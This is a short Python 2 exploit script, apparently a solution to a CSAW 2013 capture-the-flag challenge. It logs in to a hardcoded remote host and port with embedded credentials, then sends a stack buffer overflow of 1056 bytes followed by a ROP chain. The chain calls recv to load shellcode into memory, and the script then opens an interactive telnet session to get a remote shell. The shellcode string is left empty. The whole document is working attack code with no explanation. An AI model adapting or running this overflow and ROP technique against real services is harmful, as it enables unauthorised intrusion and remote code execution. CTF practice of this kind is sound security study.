# Tim Becker - 0x90.avi
import struct
import socket
import telnetlib
import sys
import time
import string

SHELLCODE = "" #fd reuse shellcode


def send_payload(f):
    
    # Not necessary to pop arguments; just did it to demonstrate ROP
    payload = (
            "\x41"*1056 +
            struct.pack("I", 0x8048890) + #recv
            struct.pack("I", 0x804956c) + # pop,pop,pop,pop,ret
            struct.pack("I", 0x4) + #socket fd
            struct.pack("I", 0x804b000) + # &(data)
            struct.pack("I", len(SHELLCODE)) + 
            struct.pack("I", 0x0) + #flags
            struct.pack("I", 0x804b000) + # &(data)
            struct.pack("I", 0x80487a0) #exit
        )

    f.write(payload + "\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('128.238.66.217', 34266))
#s.connect(('localhost', 34266))
f = s.makefile('rw', bufsize=0)
f.write("csaw2013\n")
f.write("S1mplePWD\n")
f.write("-1\n")
print s.recv(1024)

send_payload(f)

time.sleep(1)
s.send(SHELLCODE)

t = telnetlib.Telnet()
t.sock = s
t.interact()
